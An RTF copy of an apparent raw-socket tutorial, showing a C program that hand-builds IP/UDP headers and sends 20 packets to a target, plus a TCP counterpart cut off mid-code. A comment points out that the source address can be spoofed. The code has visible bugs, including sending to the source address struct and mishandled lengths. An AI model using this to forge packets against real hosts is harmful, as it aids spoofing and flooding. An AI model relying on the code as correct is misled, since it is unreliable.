{\rtf1\ansi\ansicpg1252\cocoartf1138\cocoasubrtf470
{\fonttbl\f0\fmodern\fcharset0 CourierNewPSMT;\f1\froman\fcharset0 TimesNewRomanPSMT;\f2\froman\fcharset0 Times-Roman;
\f3\fswiss\fcharset0 Helvetica;\f4\fswiss\fcharset0 ArialMT;}
{\colortbl;\red255\green255\blue255;\red225\green39\blue39;\red48\green104\blue2;\red0\green41\blue250;
\red96\green17\blue17;\red220\green59\blue255;}
\paperw11900\paperh16840\margl1440\margr1440\vieww10800\viewh8400\viewkind0
\deftab720

\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth19180\trftsWidth3 \trbrdrt\brdrnil \trbrdrl\brdrnil \trbrdrt\brdrnil \trbrdrr\brdrnil 
\clvertalt \clshdrawnil \clwWidth15860\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt20 \clpadl20 \clpadb20 \clpadr20 \gaph\cellx8640
\pard\intbl\itap1\pardeftab720

\f0\fs32 \cf0 [root@bakawali testraw]# \cf2 cat rawudp.c
\f1\fs26 \cf0 \
\pard\intbl\itap1\pardeftab720

\f0\fs32 \cf3 // ----rawudp.c------
\f1\fs26 \cf0 \

\f0\fs32 \cf3 // Must be run by root lol! Just datagram, no payload/data
\f1\fs26 \cf0 \
\pard\intbl\itap1\pardeftab720

\f0\fs32 \cf4 #include <unistd.h>
\f1\fs26 \cf0 \

\f0\fs32 \cf4 #include <stdio.h>
\f1\fs26 \cf0 \

\f0\fs32 \cf4 #include <sys/socket.h>
\f1\fs26 \cf0 \

\f0\fs32 \cf4 #include <netinet/ip.h>
\f1\fs26 \cf0 \

\f0\fs32 \cf4 #include <netinet/udp.h>
\f1\fs26 \cf0 \
\'a0\
\pard\intbl\itap1\pardeftab720

\f0\fs32 \cf3 // The packet length
\f1\fs26 \cf0 \
\pard\intbl\itap1\pardeftab720

\f0\fs32 \cf4 #define PCKT_LEN 8192
\f1\fs26 \cf0 \
\'a0\
\pard\intbl\itap1\pardeftab720

\f0\fs32 \cf3 // Can create separate header file (.h) for all headers' structure
\f1\fs26 \cf0 \

\f0\fs32 \cf3 // The IP header's structure
\f1\fs26 \cf0 \
\pard\intbl\itap1\pardeftab720

\f0\fs32 \cf4 struct ipheader \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned char\'a0\'a0\'a0\'a0\'a0 iph_ihl:5, iph_ver:4;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned char\'a0\'a0\'a0\'a0\'a0 iph_tos;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned short int iph_len;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned short int iph_ident;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned char\'a0\'a0\'a0\'a0\'a0 iph_flag;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned short int iph_offset;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned char\'a0\'a0\'a0\'a0\'a0 iph_ttl;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned char\'a0\'a0\'a0\'a0\'a0 iph_protocol;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned short int iph_chksum;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned int\'a0\'a0\'a0\'a0\'a0\'a0 iph_sourceip;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned int\'a0\'a0\'a0\'a0\'a0\'a0 iph_destip;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \};
\f1\fs26 \cf0 \
\'a0\
\pard\intbl\itap1\pardeftab720

\f0\fs32 \cf3 // UDP header's structure
\f1\fs26 \cf0 \
\pard\intbl\itap1\pardeftab720

\f0\fs32 \cf4 struct udpheader \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned short int udph_srcport;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned short int udph_destport;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned short int udph_len;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned short int udph_chksum;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \};
\f1\fs26 \cf0 \
\pard\intbl\itap1\pardeftab720

\f0\fs32 \cf3 // total udp header length: 8 bytes (=64 bits)
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf3 // Function for checksum calculation. From the RFC,
\f1\fs26 \cf0 \

\f0\fs32 \cf3 // the checksum algorithm is:
\f1\fs26 \cf0 \

\f0\fs32 \cf3 //\'a0 "The checksum field is the 16 bit one's complement of the one's
\f1\fs26 \cf0 \

\f0\fs32 \cf3 //\'a0 complement sum of all 16 bit words in the header.\'a0 For purposes of
\f1\fs26 \cf0 \

\f0\fs32 \cf3 //\'a0 computing the checksum, the value of the checksum field is zero."
\f1\fs26 \cf0 \
\pard\intbl\itap1\pardeftab720

\f0\fs32 \cf4 unsigned short csum(unsigned short *buf, int nwords)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \{\'a0\'a0\'a0\'a0\'a0\'a0 //
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 unsigned long sum;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 for(sum=0; nwords>0; nwords--)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 sum += *buf++;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 sum = (sum >> 16) + (sum &0xffff);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 sum += (sum >> 16);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 return (unsigned short)(~sum);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \}
\f1\fs26 \cf0 \cell \lastrow\row
\pard\pardeftab720

\f0\fs32 \cf3 // Source IP, source port, target IP, target port from the command line arguments
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 int main(int argc, char *argv[])
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 int sd;
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // No data/payload just datagram
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 char buffer[PCKT_LEN];
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // Our own headers' structures
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 struct ipheader *ip = (struct ipheader *) buffer;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // Source and destination addresses: IP and port
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 struct sockaddr_in sin, din;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 int one = 1;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 const int *val = &one;
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 memset(buffer, 0, PCKT_LEN);
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 if(argc != 5)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 printf("- Invalid parameters!!!\\n");
\f1\fs26 \cf0 \

\f0\fs32 \cf4 printf("- Usage %s <source hostname/IP> <source port> <target hostname/IP> <target port>\\n", argv[0]);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 exit(-1);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \}
\f1\fs26 \cf0 \
\'a0\
\pard\pardeftab720

\f0\fs32 \cf3 // Create a raw socket with UDP protocol
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 if(sd < 0)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 perror("socket() error");
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // If something wrong just exit
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 exit(-1);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \}
\f1\fs26 \cf0 \

\f0\fs32 \cf4 else
\f1\fs26 \cf0 \

\f0\fs32 \cf4 printf("socket() - Using SOCK_RAW socket and UDP protocol is OK.\\n");
\f1\fs26 \cf0 \
\'a0\
\pard\pardeftab720

\f0\fs32 \cf3 // The source is redundant, may be used later if needed
\f1\fs26 \cf0 \

\f0\fs32 \cf3 // The address family
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 sin.sin_family = AF_INET;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 din.sin_family = AF_INET;
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // Port numbers
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 sin.sin_port = htons(atoi(argv[2]));
\f1\fs26 \cf0 \

\f0\fs32 \cf4 din.sin_port = htons(atoi(argv[4]));
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // IP addresses
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 sin.sin_addr.s_addr = inet_addr(argv[1]);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 din.sin_addr.s_addr = inet_addr(argv[3]);
\f1\fs26 \cf0 \
\'a0\
\pard\pardeftab720

\f0\fs32 \cf3 // Fabricate the IP header or we can use the
\f1\fs26 \cf0 \

\f0\fs32 \cf3 // standard header structures but assign our own values.
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 ip->iph_ihl = 5;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 ip->iph_ver = 4;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 ip->iph_tos = 16; \cf3 // Low delay
\f1\fs26 \cf0 \

\f0\fs32 \cf4 ip->iph_len = sizeof(struct ipheader) + sizeof(struct udpheader);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 ip->iph_ident = htons(54321);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 ip->iph_ttl = 64; \cf3 // hops
\f1\fs26 \cf0 \

\f0\fs32 \cf4 ip->iph_protocol = 17; \cf3 // UDP
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // Source IP address, can use spoofed address here!!!
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 ip->iph_sourceip = inet_addr(argv[1]);
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // The destination IP address
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 ip->iph_destip = inet_addr(argv[3]);
\f1\fs26 \cf0 \
\'a0\
\pard\pardeftab720

\f0\fs32 \cf3 // Fabricate the UDP header. Source port number, redundant
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 udp->udph_srcport = htons(atoi(argv[2]));
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // Destination port number
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 udp->udph_destport = htons(atoi(argv[4]));
\f1\fs26 \cf0 \

\f0\fs32 \cf4 udp->udph_len = htons(sizeof(struct udpheader));
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // Calculate the checksum for integrity
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // Inform the kernel do not fill up the packet structure. we will build our own...
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 perror("setsockopt() error");
\f1\fs26 \cf0 \

\f0\fs32 \cf4 exit(-1);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \}
\f1\fs26 \cf0 \

\f0\fs32 \cf4 else
\f1\fs26 \cf0 \

\f0\fs32 \cf4 printf("setsockopt() is OK.\\n");
\f1\fs26 \cf0 \
\'a0\
\pard\pardeftab720

\f0\fs32 \cf3 // Send loop, send for every 2 second for 100 count
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 printf("Trying...\\n");
\f1\fs26 \cf0 \

\f0\fs32 \cf4 printf("Using raw socket and UDP protocol\\n");
\f1\fs26 \cf0 \

\f0\fs32 \cf4 printf("Using Source IP: %s port: %u, Target IP: %s port: %u.\\n", argv[1], atoi(argv[2]), argv[3], atoi(argv[4]));
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 int count;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 for(count = 1; count <=20; count++)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 if(sendto(sd, buffer, ip->iph_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // Verify
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 perror("sendto() error");
\f1\fs26 \cf0 \

\f0\fs32 \cf4 exit(-1);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \}
\f1\fs26 \cf0 \

\f0\fs32 \cf4 else
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 printf("Count #%u - sendto() is OK.\\n", count);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 sleep(2);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \}
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \}
\f1\fs26 \cf0 \

\f0\fs32 \cf4 close(sd);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 return 0;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \}
\f1\fs26 \cf0 \
\'a0\

\itap1\trowd \taflags0 \trgaph108\trleft-108 \trwWidth19180\trftsWidth3 \trbrdrt\brdrnil \trbrdrl\brdrnil \trbrdrt\brdrnil \trbrdrr\brdrnil 
\clvertalc \clshdrawnil \clwWidth12880\clftsWidth3 \clmart10 \clmarl10 \clmarb10 \clmarr10 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt20 \clpadl20 \clpadb20 \clpadr20 \gaph\cellx4320
\clvertalc \clshdrawnil \clwWidth6080\clftsWidth3 \clmart10 \clmarl10 \clmarb10 \clmarr10 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf2 \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt20 \clpadl20 \clpadb20 \clpadr20 \gaph\cellx8640
\pard\intbl\itap1\pardeftab720

\f0\fs32 \cf0 [root@bakawali testraw]# \cf2 gcc rawudp.c -o rawudp
\f1\fs26 \cf0 \

\f0\fs32 [root@bakawali testraw]# \cf2 ./rawudp
\f1\fs26 \cf0 \
\pard\intbl\itap1\pardeftab720

\f0\fs32 \cf5 - Invalid parameters!!!
\f1\fs26 \cf0 \

\f0\fs32 \cf5 - Usage ./rawudp <source hostname/IP> <source port> <target hostname/IP> <target port>
\f1\fs26 \cf0 \
\pard\intbl\itap1\pardeftab720

\f0\fs32 \cf0 [root@bakawali testraw]# \cf2 ./rawudp 192.168.10.10 21 203.106.93.91 8080
\f1\fs26 \cf0 \
\pard\intbl\itap1\pardeftab720

\f0\fs32 \cf5 socket() - Using SOCK_RAW socket and UDP protocol is OK.
\f1\fs26 \cf0 \

\f0\fs32 \cf5 setsockopt() is OK.
\f1\fs26 \cf0 \

\f0\fs32 \cf5 Trying...
\f1\fs26 \cf0 \

\f0\fs32 \cf5 Using raw socket and UDP protocol
\f1\fs26 \cf0 \

\f0\fs32 \cf5 Using Source IP: 192.168.10.10 port: 21, Target IP: 203.106.93.91 port: 8080.
\f1\fs26 \cf0 \

\f0\fs32 \cf5 Count #1 - sendto() is OK.
\f1\fs26 \cf0 \

\f0\fs32 \cf5 Count #2 - sendto() is OK.
\f1\fs26 \cf0 \

\f0\fs32 \cf5 Count #3 - sendto() is OK.
\f1\fs26 \cf0 \

\f0\fs32 \cf5 Count #4 - sendto() is OK.
\f1\fs26 \cf0 \

\f0\fs32 \cf5 Count #5 - sendto() is OK.
\f1\fs26 \cf0 \

\f0\fs32 \cf5 Count #6 - sendto() is OK.
\f1\fs26 \cf0 \

\f0\fs32 \cf5 Count #7 - sendto() is OK.
\f1\fs26 \cf0 \

\f0\fs32 \cf5 ...
\f1\fs26 \cf0 \cell 
\pard\intbl\itap1\pardeftab720

\f2\fs32 \cf0 \
\

\f3\fs24 {{\NeXTGraphic icon.png \width300 \height300 \noorient
}¬}
\f2\fs32 \cell \lastrow\row
\pard\pardeftab720

\f1\fs26 \cf0 \'a0\
\pard\pardeftab720

\f4\fs32 \cf0 You can use network monitoring tools to capture the raw socket datagrams at the target machine to see the effect.\'a0 The following is a raw socket and tcp program example.
\f1\fs26 \
\pard\pardeftab720

\f0\fs32 \cf0 [root@bakawali testraw]# \cf2 cat rawtcp.c
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 //---cat rawtcp.c---
\f1\fs26 \cf0 \

\f0\fs32 \cf3 // Run as root or SUID 0, just datagram no data/payload
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 #include <unistd.h>
\f1\fs26 \cf0 \

\f0\fs32 \cf4 #include <stdio.h>
\f1\fs26 \cf0 \

\f0\fs32 \cf4 #include <sys/socket.h>
\f1\fs26 \cf0 \

\f0\fs32 \cf4 #include <netinet/ip.h>
\f1\fs26 \cf0 \

\f0\fs32 \cf4 #include <netinet/tcp.h>
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // Packet length
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 #define PCKT_LEN 8192
\f1\fs26 \cf0 \
\'a0\
\pard\pardeftab720

\f0\fs32 \cf3 // May create separate header file (.h) for all
\f1\fs26 \cf0 \

\f0\fs32 \cf3 // headers' structures
\f1\fs26 \cf0 \

\f0\fs32 \cf3 // IP header's structure
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 struct ipheader \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned char\'a0\'a0\'a0\'a0\'a0 iph_ihl:5, \cf3 /* Little-endian */
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 iph_ver:4;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned char\'a0\'a0\'a0\'a0\'a0 iph_tos;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned short int iph_len;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned short int iph_ident;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned char\'a0\'a0\'a0\'a0\'a0 iph_flags;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned short int iph_offset;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned char\'a0\'a0\'a0\'a0\'a0 iph_ttl;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned char\'a0\'a0\'a0\'a0\'a0 iph_protocol;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned short int iph_chksum;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned int\'a0\'a0\'a0\'a0\'a0\'a0 iph_sourceip;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned int\'a0\'a0\'a0\'a0\'a0\'a0 iph_destip;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \};
\f1\fs26 \cf0 \
\'a0\
\pard\pardeftab720

\f0\fs32 \cf3 /* Structure of a TCP header */
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 struct tcpheader \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned short int tcph_srcport;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned short int tcph_destport;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned int\'a0\'a0\'a0\'a0\'a0\'a0 tcph_seqnum;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned int\'a0\'a0\'a0\'a0\'a0\'a0 tcph_acknum;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned char\'a0\'a0\'a0\'a0\'a0 tcph_reserved:4, tcph_offset:4;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\cf3 // unsigned char tcph_flags;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0 unsigned int
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 tcp_res1:4,\'a0\'a0\'a0\'a0\'a0\'a0 \cf3 /*little-endian*/
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 tcph_hlen:4,\'a0\'a0\'a0\'a0\'a0 \cf3 /*length of tcp header in 32-bit words*/
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 tcph_fin:1,\'a0\'a0\'a0\'a0\'a0\'a0 \cf3 /*Finish flag "fin"*/
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 tcph_syn:1,\'a0\'a0\'a0\'a0\'a0\'a0 \cf3 /*Synchronize sequence numbers to start a connection*/
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 tcph_rst:1,\'a0\'a0\'a0\'a0\'a0\'a0 \cf3 /*Reset flag */
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 tcph_psh:1,\'a0\'a0\'a0\'a0\'a0\'a0 \cf3 /*Push, sends data to the application*/
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 tcph_ack:1,\'a0\'a0\'a0\'a0\'a0\'a0 \cf3 /*acknowledge*/
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 tcph_urg:1,\'a0\'a0\'a0\'a0\'a0\'a0 \cf3 /*urgent pointer*/
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0 tcph_res2:2;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned short int tcph_win;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned short int tcph_chksum;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0unsigned short int tcph_urgptr;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \};
\f1\fs26 \cf0 \
\'a0\
\pard\pardeftab720

\f0\fs32 \cf3 // Simple checksum function, may use others such as Cyclic Redundancy Check, CRC
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 unsigned short csum(unsigned short *buf, int len)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 unsigned long sum;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 for(sum=0; len>0; len--)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 sum += *buf++;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 sum = (sum >> 16) + (sum &0xffff);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 sum += (sum >> 16);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 return (unsigned short)(~sum);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \}
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 int main(int argc, char *argv[])
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 int sd;
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // No data, just datagram
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 char buffer[PCKT_LEN];
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // The size of the headers
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 struct ipheader *ip = (struct ipheader *) buffer;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 struct tcpheader *tcp = (struct tcpheader *) (buffer + sizeof(struct ipheader));
\f1\fs26 \cf0 \

\f0\fs32 \cf4 struct sockaddr_in sin, din;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 int one = 1;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 const int *val = &one;
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 memset(buffer, 0, PCKT_LEN);
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 if(argc != 5)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 printf("- Invalid parameters!!!\\n");
\f1\fs26 \cf0 \

\f0\fs32 \cf4 printf("- Usage: %s <source hostname/IP> <source port> <target hostname/IP> <target port>\\n", argv[0]);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 exit(-1);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \}
\f1\fs26 \cf0 \
\'a0\

\f0\fs32 \cf4 sd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 if(sd < 0)
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \{
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0 perror("socket() error");
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \'a0\'a0 exit(-1);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 \}
\f1\fs26 \cf0 \

\f0\fs32 \cf4 else
\f1\fs26 \cf0 \

\f0\fs32 \cf4 printf("socket()-SOCK_RAW and tcp protocol is OK.\\n");
\f1\fs26 \cf0 \
\'a0\
\pard\pardeftab720

\f0\fs32 \cf3 // The source is redundant, may be used later if needed
\f1\fs26 \cf0 \

\f0\fs32 \cf3 // Address family
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 sin.sin_family = AF_INET;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 din.sin_family = AF_INET;
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // Source port, can be any, modify as needed
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 sin.sin_port = htons(atoi(argv[2]));
\f1\fs26 \cf0 \

\f0\fs32 \cf4 din.sin_port = htons(atoi(argv[4]));
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // Source IP, can be any, modify as needed
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 sin.sin_addr.s_addr = inet_addr(argv[1]);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 din.sin_addr.s_addr = inet_addr(argv[3]);
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf3 // IP structure
\f1\fs26 \cf0 \
\pard\pardeftab720

\f0\fs32 \cf4 ip->iph_ihl = 5;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 ip->iph_ver = 4;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 ip->iph_tos = 16;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 ip->iph_len = sizeof(struct ipheader) + sizeof(struct tcpheader);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 ip->iph_ident = htons(54321);
\f1\fs26 \cf0 \

\f0\fs32 \cf4 ip->iph_offset = 0;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 ip->iph_ttl = 64;
\f1\fs26 \cf0 \

\f0\fs32 \cf4 ip->iph_protocol = 6; \cf3 // TCP
\f1\fs26 \cf0 \

\f0\fs32 \cf4 ip->iph_chksum = 0; \cf3 // Done by kernel
\f1\fs26 \cf0 \
\'a0\
\pard\pardeftab720

